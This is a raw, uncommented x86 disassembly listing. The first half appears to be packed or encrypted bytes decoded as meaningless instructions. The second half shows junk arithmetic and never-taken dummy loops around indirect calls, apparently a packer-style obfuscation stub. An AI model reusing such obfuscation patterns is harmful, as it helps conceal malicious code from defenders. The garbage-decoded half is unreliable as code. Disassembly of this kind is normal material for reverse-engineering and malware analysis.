  40574a:	(bad)  
  40574b:	(bad)  
  40574d:	pop    DWORD PTR gs:[ebx]
  405750:	push   ds
  405751:	mov    ah,0xed
  405753:	cmp    BYTE PTR [ecx],0x2f
  405756:	push   ebx
  405757:	icebp  
  405758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405759:	push   ds
  40575a:	push   ecx
  40575b:	pop    ds
  40575c:	pop    esp
  40575d:	mov    ?,WORD PTR [edx-0x7999a582]
  405763:	retf   
  405764:	es jp  0x4057ac
  405767:	add    esi,ecx
  405769:	popf   
  40576a:	dec    ebp
  40576b:	pop    edi
  40576c:	adc    bl,0x75
  40576f:	inc    BYTE PTR [edx]
  405771:	cwde   
  405772:	xor    esp,edx
  405774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405775:	jno    0x4057ba
  405777:	mov    ch,0x98
  405779:	sub    ebp,DWORD PTR [edi-0x57c6002a]
  40577f:	cmp    bl,BYTE PTR [ebx+0x7f]
  405782:	and    DWORD PTR [edx],esi
  405784:	pop    ebp
  405785:	fidivr WORD PTR [esi]
  405787:	xchg   esi,eax
  405788:	arpl   WORD PTR ds:0x340ee30,cx
  40578e:	xchg   ebp,eax
  40578f:	in     eax,dx
  405790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405791:	pop    esi
  405792:	jg     0x4057b9
  405794:	dec    ebx
  405795:	cmp    ah,BYTE PTR [ebx-0x5f966ba]
  40579b:	js     0x405742
  40579d:	pop    eax
  40579e:	mov    edi,0xbfb1b5a3
  4057a3:	out    dx,eax
  4057a4:	cmp    al,0xdf
  4057a6:	push   cs
  4057a7:	sti    
  4057a8:	inc    edi
  4057a9:	add    cl,al
  4057ab:	mov    dh,0x80
  4057ad:	add    al,0x7a
  4057af:	loope  0x4057ed
  4057b1:	dec    eax
  4057b2:	jo     0x4057f7
  4057b4:	out    0xe6,eax
  4057b6:	sbb    dh,dl
  4057b8:	pop    ss
  4057b9:	or     ecx,0x33256bf8
  4057bf:	mov    ah,0x2b
  4057c1:	xchg   edi,eax
  4057c2:	imul   DWORD PTR [esi+0x10]
  4057c5:	mov    ecx,0x3c70aea3
  4057ca:	adc    eax,0xc7c1238e
  4057cf:	jecxz  0x4057e3
  4057d1:	sbb    DWORD PTR gs:[ebx-0x1],esp
  4057d5:	popa   
  4057d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d7:	push   0x3bebf3d3
  4057dc:	jnp    0x405794
  4057de:	test   eax,0x57c3aef7
  4057e3:	or     ch,BYTE PTR [ecx+0x1c]
  4057e6:	in     eax,0x82
  4057e8:	ret    
  4057e9:	dec    eax
  4057ea:	(bad)  
  4057eb:	scas   al,BYTE PTR es:[edi]
  4057ec:	pushf  
  4057ed:	xchg   DWORD PTR [edi],ebp
  4057ef:	pusha  
  4057f0:	mov    BYTE PTR [ebx],dl
  4057f2:	ins    BYTE PTR es:[edi],dx
  4057f3:	es ds sbb dh,dh
  4057f7:	and    eax,0x7a71e15b
  4057fc:	dec    ebx
  4057fd:	pushf  
  4057fe:	push   edi
  4057ff:	clc    
  405800:	sbb    al,0x4b
  405802:	sbb    al,0x7d
  405804:	pop    esp
  405805:	retf   
  405806:	(bad)  
  405807:	shr    cl,1
  405809:	ds ret 
  40580b:	ret    
  40580c:	sub    eax,0x8e874214
  405811:	out    dx,eax
  405812:	cmp    BYTE PTR [ebp+0x42f23271],ch
  405818:	mov    edi,0xe297083e
  40581d:	test   al,0x5c
  40581f:	and    BYTE PTR [esi+0x1003d8d7],0xd4
  405826:	dec    ecx
  405827:	cmp    al,BYTE PTR [ecx+0xe]
  40582a:	(bad)  
  40582c:	popf   
  40582d:	lock push esp
  40582f:	xor    eax,0x774ade4f
  405834:	popa   
  405835:	push   ss
  405836:	sbb    bh,0x16
  405839:	inc    edi
  40583a:	cmc    
  40583b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40583c:	xchg   edi,eax
  40583d:	jp     0x405818
  40583f:	loope  0x4057c6
  405841:	mov    edi,0xb34bb8a9
  405846:	push   edi
  405847:	adc    BYTE PTR [ebp-0x765f2d12],dl
  40584d:	adc    eax,0xd3886c65
  405852:	std    
  405853:	inc    esi
  405854:	push   ss
  405855:	inc    eax
  405856:	addr16 push 0xffffffc5
  405859:	pop    edi
  40585a:	push   es
  40585b:	in     eax,dx
  40585c:	or     cl,BYTE PTR [eax]
  40585e:	inc    ebp
  40585f:	clc    
  405860:	mov    esi,0x69b5308f
  405865:	jbe    0x40581d
  405867:	not    BYTE PTR [esi]
  405869:	pop    ecx
  40586a:	not    DWORD PTR [ebx+0x32]
  40586d:	bound  esp,QWORD PTR [ebx-0x5ad314c2]
  405873:	push   0xffffff9e
  405875:	inc    ecx
  405876:	jns    0x4058ca
  405878:	dec    edi
  405879:	xor    al,0xae
  40587b:	(bad)  
  40587c:	lahf   
  40587d:	adc    al,0x1
  40587f:	in     al,0xe8
  405881:	sti    
  405882:	(bad)  
  405883:	cmp    eax,0x3eda08a1
  405888:	scas   eax,DWORD PTR es:[edi]
  405889:	lods   al,BYTE PTR ds:[esi]
  40588a:	or     al,BYTE PTR [ecx+0x2dac9ae4]
  405890:	imul   esp,DWORD PTR [esi-0x46],0xa1e9ab6c
  405897:	mov    edi,0x3a6f122
  40589c:	inc    ebx
  40589d:	rcl    cl,cl
  40589f:	or     ecx,DWORD PTR [ebx+0x79]
  4058a2:	jle    0x4058c9
  4058a4:	loope  0x405859
  4058a6:	lahf   
  4058a7:	adc    DWORD PTR [ecx+0x6b],esi
  4058aa:	(bad)  
  4058ab:	enter  0x57ed,0x8
  4058af:	(bad)  
  4058b0:	xchg   edi,eax
  4058b1:	lods   al,BYTE PTR ds:[esi]
  4058b2:	fstp   QWORD PTR [ecx+0x38]
  4058b5:	add    DWORD PTR [edi+0x5f],eax
  4058b8:	jg     0x405919
  4058ba:	fisub  DWORD PTR [ebx-0x2171f439]
  4058c0:	push   ebp
  4058c1:	aas    
  4058c2:	fwait
  4058c3:	and    bh,BYTE PTR [ebx+ecx*2-0xc340340]
  4058ca:	xchg   DWORD PTR [edi+0x6e2af696],esp
  4058d0:	pop    ss
  4058d1:	mov    fs,WORD PTR [esi-0x19]
  4058d4:	sti    
  4058d5:	icebp  
  4058d6:	jnp    0x4058a8
  4058d8:	or     ah,BYTE PTR [esi+0x62]
  4058db:	push   eax
  4058dc:	std    
  4058dd:	cwde   
  4058de:	enter  0x7787,0xf1
  4058e2:	(bad)  
  4058e3:	aam    0x28
  4058e5:	aam    0x92
  4058e7:	lods   al,BYTE PTR ds:[esi]
  4058e8:	adc    DWORD PTR [eax+0x45],esi
  4058eb:	mov    ds:0xe451f966,al
  4058f0:	(bad)  
  4058f1:	mov    ds:0x1fc8ac4a,eax
  4058f6:	xor    DWORD PTR [esi],0x772bd0f
  4058fc:	shl    BYTE PTR [edx-0x5d74eae2],0xad
  405903:	sub    al,0xe9
  405905:	fs fs stc 
  405908:	and    eax,0x2188e12c
  40590d:	inc    edi
  40590e:	xlat   BYTE PTR ds:[ebx]
  40590f:	sbb    DWORD PTR [edi+0x57],0x4aee14d3
  405916:	cmp    bh,BYTE PTR [edi+0xf5b0a5d]
  40591c:	ja     0x40599d
  40591e:	or     al,0x28
  405920:	loopne 0x405923
  405922:	ror    DWORD PTR [eax-0x6a586056],cl
  405928:	std    
  405929:	inc    ebp
  40592a:	cmp    eax,DWORD PTR [edx+0x5244918]
  405930:	inc    eax
  405931:	cs stc 
  405933:	push   es
  405934:	daa    
  405935:	in     eax,0xf2
  405937:	mov    al,ds:0xaf00b153
  40593c:	arpl   WORD PTR es:[esi-0x34175cdd],di
  405943:	call   0x252e:0x25d012a4
  40594a:	dec    eax
  40594b:	xchg   edi,eax
  40594c:	stc    
  40594d:	jno    0x405964
  40594f:	pop    es
  405950:	push   eax
  405951:	dec    edi
  405952:	push   0xdce8b97c
  405957:	pushf  
  405958:	ror    BYTE PTR [esp+ecx*8+0x6609e3fd],cl
  40595f:	adc    dh,BYTE PTR [edi-0x310f5446]
  405965:	and    dl,BYTE PTR ds:0x5498f66f
  40596b:	outs   dx,DWORD PTR ds:[esi]
  40596c:	pop    edi
  40596d:	arpl   ax,cx
  40596f:	push   0xffffffc0
  405971:	(bad)  
  405972:	aad    0xd2
  405974:	add    esi,eax
  405976:	and    BYTE PTR [edi-0x56a45328],al
  40597c:	pop    es
  40597d:	fucomip st,st(0)
  40597f:	and    edx,esi
  405981:	test   al,0x8a
  405983:	sub    al,0xe3
  405985:	mov    dh,0x73
  405987:	add    BYTE PTR fs:[ebx],cl
  40598a:	xlat   BYTE PTR ds:[ebx]
  40598b:	push   esp
  40598c:	ja     0x405993
  40598e:	xchg   esi,eax
  40598f:	inc    edi
  405990:	mov    BYTE PTR [ebx],ah
  405992:	mov    esi,0xa0886d3d
  405997:	test   BYTE PTR [edx+0x500b0043],ah
  40599d:	sub    DWORD PTR ds:0x89a35bdf,esi
  4059a3:	jmp    0x4059c0
  4059a5:	xlat   BYTE PTR ds:[ebx]
  4059a6:	mov    eax,ds:0xbd85b66c
  4059ab:	jno    0x405942
  4059ad:	mov    eax,0xba29ff88
  4059b2:	and    al,0x7
  4059b4:	push   edx
  4059b5:	mov    ah,0xb2
  4059b7:	xor    eax,0x77b04e68
  4059bc:	pusha  
  4059bd:	pop    es
  4059be:	(bad)  
  4059bf:	lds    edx,FWORD PTR [esi]
  4059c1:	data16 sbb al,0x77
  4059c4:	and    al,0xab
  4059c7:	imul   ecx,DWORD PTR [eax+0x40b58a37],0x57
  4059ce:	or     al,0x44
  4059d0:	in     al,0x4f
  4059d2:	push   edi
  4059d3:	sub    DWORD PTR [ebx-0x54072f1],ebp
  4059d9:	cmc    
  4059da:	je     0x405974
  4059dc:	loope  0x405a54
  4059de:	popf   
  4059df:	push   0x2fb65a6f
  4059e4:	test   eax,0x4034fc6f
  4059e9:	lock test edi,esp
  4059ec:	jp     0x40596f
  4059ee:	mov    dl,0x93
  4059f0:	mul    BYTE PTR [ecx-0x33d43847]
  4059f6:	sub    ah,al
  4059f8:	in     al,0x4
  4059fa:	out    dx,eax
  4059fb:	jne    0x405a56
  4059fd:	test   dl,ah
  4059ff:	pushf  
  405a00:	ficomp WORD PTR [ebx+ecx*4-0x16]
  405a04:	les    edx,FWORD PTR [edi]
  405a06:	inc    ebp
  405a07:	inc    eax
  405a08:	fstp   DWORD PTR [ebx+0x3b]
  405a0b:	les    esi,FWORD PTR [ecx]
  405a0d:	loop   0x405a5a
  405a0f:	cmp    BYTE PTR [edx-0x7bfde088],bh
  405a15:	adc    DWORD PTR [edi+0x1ecfd2a4],0x10
  405a1c:	xchg   esp,eax
  405a1d:	pop    esp
  405a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1f:	mov    al,0x3a
  405a21:	sub    ecx,edi
  405a23:	adc    DWORD PTR [esp+ebp*4-0x3],esi
  405a27:	pop    esi
  405a28:	mov    dl,0x13
  405a2a:	sbb    edi,ecx
  405a2c:	and    al,0xa9
  405a2e:	xchg   ebx,eax
  405a2f:	push   edi
  405a30:	rcl    DWORD PTR [esi+esi*2],cl
  405a33:	cmc    
  405a34:	sub    eax,0x3eb66db3
  405a39:	adc    WORD PTR [esi+edx*8],bp
  405a3d:	jmp    0xa31c:0x57159ea1
  405a44:	iret   
  405a45:	repz (bad) 
  405a47:	mov    dl,0xfb
  405a49:	test   ah,al
  405a4b:	loope  0x405a0d
  405a4d:	test   BYTE PTR [ebx+0x54b288e],ah
  405a53:	cdq    
  405a54:	scas   eax,DWORD PTR es:[edi]
  405a55:	imul   edx,DWORD PTR [esi+ebx*8-0x70],0x63
  405a5a:	loope  0x405a1d
  405a5c:	or     BYTE PTR [eax-0x30ea6544],cl
  405a62:	iret   
  405a63:	xchg   ebp,eax
  405a64:	or     dh,ah
  405a66:	cmp    bh,BYTE PTR [edi-0x25]
  405a69:	clc    
  405a6a:	fucomip st,st(4)
  405a6c:	std    
  405a6d:	(bad)  
  405a6e:	sub    al,BYTE PTR [edi+eax*2-0x3e31e5f7]
  405a75:	(bad)
  405a79:	fs in  al,dx
  405a7b:	and    DWORD PTR [ebp+0x36],edx
  405a7e:	imul   DWORD PTR [eiz*1+0x16cf4b2e]
  405a85:	add    dl,BYTE PTR [ebx+0x72940de1]
  405a8b:	xor    dh,BYTE PTR [edx]
  405a8d:	lea    ebx,[ebx-0x3ff38075]
  405a93:	sti    
  405a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a95:	xchg   ebp,eax
  405a96:	inc    esi
  405a97:	jne    0x405a97
  405a99:	test   BYTE PTR [esi-0x35bcbfc1],bl
  405a9f:	pop    ebx
  405aa0:	ins    DWORD PTR es:[edi],dx
  405aa1:	ins    BYTE PTR es:[edi],dx
  405aa2:	dec    esi
  405aa3:	sti    
  405aa4:	(bad)  
  405aa5:	ror    BYTE PTR es:[ebx+0x71],1
  405aa9:	(bad)  
  405aaa:	mov    esi,0x30bd22b9
  405aaf:	repnz bound esp,QWORD PTR [ecx+ecx*4]
  405ab3:	(bad)  [esp+edx*1-0x10]
  405ab7:	arpl   sp,dx
  405ab9:	pop    ss
  405aba:	pop    eax
  405abb:	jmp    0x405ada
  405abd:	add    DWORD PTR [ecx-0x6d],0x62e54e9e
  405ac4:	out    0x34,eax
  405ac6:	inc    edx
  405ac7:	outs   dx,DWORD PTR ds:[esi]
  405ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac9:	dec    esp
  405acb:	jmp    0xa9f5342f
  405ad0:	hlt    
  405ad1:	xchg   BYTE PTR [edi+esi*1],bl
  405ad4:	xchg   edi,eax
  405ad5:	aam    0xc1
  405ad7:	in     eax,dx
  405ad8:	and    DWORD PTR [eax],ecx
  405ada:	xchg   esi,eax
  405adb:	es inc ebx
  405add:	aam    0x48
  405adf:	mov    cl,0x13
  405ae1:	adc    BYTE PTR [esp+ecx*4+0x50],cl
  405ae5:	mov    dh,0xa9
  405ae7:	(bad)  
  405ae8:	fst    DWORD PTR [edi-0x1c9f576a]
  405aee:	pop    ebp
  405aef:	in     al,0x48
  405af1:	in     al,dx
  405af2:	cmp    BYTE PTR [ebx+ecx*2+0x17bbd5c6],ah
  405af9:	cwde   
  405afa:	mov    edi,0x440fdd4a
  405aff:	jno    0x405ac6
  405b01:	xchg   esi,eax
  405b02:	mov    esp,0xb5690920
  405b07:	repz mov al,0x42
  405b0b:	retf   
  405b0c:	and    al,0x65
  405b0e:	inc    ecx
  405b0f:	jl     0x405ac5
  405b11:	pop    esi
  405b12:	mov    esi,0xfe9f3eae
  405b17:	mov    dl,0xad
  405b19:	push   esp
  405b1a:	jne    0x405b0c
  405b1c:	jo     0x405aea
  405b1e:	inc    esi
  405b1f:	fistp  WORD PTR [esp+edi*4-0x53]
  405b23:	not    bl
  405b25:	inc    ebx
  405b26:	lock add eax,ebx
  405b29:	std    
  405b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b2b:	sbb    ebx,DWORD PTR [esi+0x37]
  405b2e:	xor    dh,bh
  405b30:	mov    edi,0x8d353d6a
  405b35:	nop
  405b36:	and    bl,BYTE PTR [bp+si+0x5ba8]
  405b3b:	test   eax,0xda435aac
  405b40:	js     0x405b6a
  405b42:	pusha  
  405b43:	dec    ebx
  405b44:	cmc    
  405b45:	test   al,0x11
  405b47:	xchg   edx,eax
  405b48:	pushf  
  405b49:	out    0xd8,al
  405b4b:	aaa    
  405b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b4d:	push   eax
  405b4e:	add    DWORD PTR ds:0x883a1d88,edi
  405b54:	retf   
  405b55:	jle    0x405b9e
  405b57:	dec    esp
  405b58:	dec    ecx
  405b59:	bound  esi,QWORD PTR [esi-0x35309e9b]
  405b5f:	shl    BYTE PTR [eax-0x3918a60b],cl
  405b65:	mov    esi,0x49eeb1ce
  405b6a:	mov    dh,0x84
  405b6c:	jns    0x405b5f
  405b6e:	mov    edx,0x3e1f9fa8
  405b73:	repnz dec ebp
  405b75:	retf   
  405b76:	jge    0x405b59
  405b78:	jecxz  0x405bdd
  405b7a:	add    esp,DWORD PTR [esi]
  405b7c:	imul   eax,DWORD PTR [esi],0x285369b6
  405b82:	sbb    bl,BYTE PTR [ecx]
  405b84:	jns    0x405bf9
  405b86:	or     BYTE PTR [edi+0x3046da63],dl
  405b8c:	inc    edi
  405b8d:	or     cl,al
  405b8f:	and    DWORD PTR [ebp-0x3b],esp
  405b92:	retf   0x2a53
  405b95:	shr    BYTE PTR [ecx+ebx*4],1
  405b98:	jl     0x405b1e
  405b9a:	xchg   edx,eax
  405b9b:	or     bh,BYTE PTR [edi]
  405b9d:	sub    BYTE PTR [edi+0x34],0x3a
  405ba1:	pop    edi
  405ba2:	jo     0x405b71
  405ba4:	push   ds
  405ba5:	add    edi,DWORD PTR [edi+edx*1+0x6a]
  405ba9:	je     0x405bcb
  405bab:	xor    BYTE PTR [esi],ah
  405bad:	sub    bh,dl
  405baf:	and    ch,BYTE PTR [eax-0xe]
  405bb2:	mov    dh,0xcd
  405bb4:	mov    ds:0x51ec07f6,eax
  405bb9:	fcomp  DWORD PTR [esi-0x57ff65b2]
  405bbf:	rol    DWORD PTR [ecx+0x97ffac7],1
  405bc5:	mov    esi,0x8a0e4c67
  405bca:	fcomip st,st(4)
  405bcc:	test   BYTE PTR [edx+ebp*2-0x76],al
  405bd0:	call   0xfa19:0x718f99ab
  405bd7:	cmp    dl,BYTE PTR [edx]
  405bd9:	dec    eax
  405bda:	js     0x405c41
  405bdc:	div    esi
  405bde:	icebp  
  405bdf:	cmp    BYTE PTR [eax-0x2f],dl
  405be2:	mov    edx,0xacd49241
  405be7:	cmc    
  405be8:	push   ecx
  405be9:	icebp  
  405bea:	jb     0x405bda
  405bec:	mov    esp,0xb39b2399
  405bf1:	mov    cs,WORD PTR [edi+edx*1-0x271983ab]
  405bf8:	mov    dh,0x89
  405bfa:	mov    ebp,0x826b9e17
  405bff:	and    edi,ecx
  405c01:	push   eax
  405c02:	retf   0x895e
  405c05:	push   0xb865350
  405c0a:	int3   
  405c0b:	dec    esp
  405c0c:	sub    edx,eax
  405c0e:	loop   0x405c48
  405c10:	pop    es
  405c11:	data16 daa 
  405c13:	ficomp WORD PTR [ebx-0x40c483ef]
  405c19:	push   edi
  405c1a:	adc    bl,BYTE PTR [ebp-0x9]
  405c1d:	mov    edi,0xf4a5697b
  405c22:	add    ch,al
  405c24:	inc    ebx
  405c25:	cmp    BYTE PTR [esi+0x78],0x1e
  405c29:	outs   dx,BYTE PTR ds:[esi]
  405c2a:	dec    ecx
  405c2b:	add    al,0x48
  405c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c2e:	adc    dh,BYTE PTR [ebx*4+0x76ef0555]
  405c35:	sti    
  405c36:	push   esi
  405c37:	jmp    0x32443c35
  405c3c:	mov    esi,0xefcf51f7
  405c41:	pop    DWORD PTR [ecx-0x8]
  405c44:	add    eax,0x83ec1ad7
  405c49:	mov    dl,0xa1
  405c4b:	mov    ds:0xff00421a,al
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421cfe
  405c57:	push   DWORD PTR ds:0x421aaa
  405c5d:	push   DWORD PTR ds:0x421cde
  405c63:	push   DWORD PTR ds:0x421d72
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ca2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423887
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423846
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423ab2
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
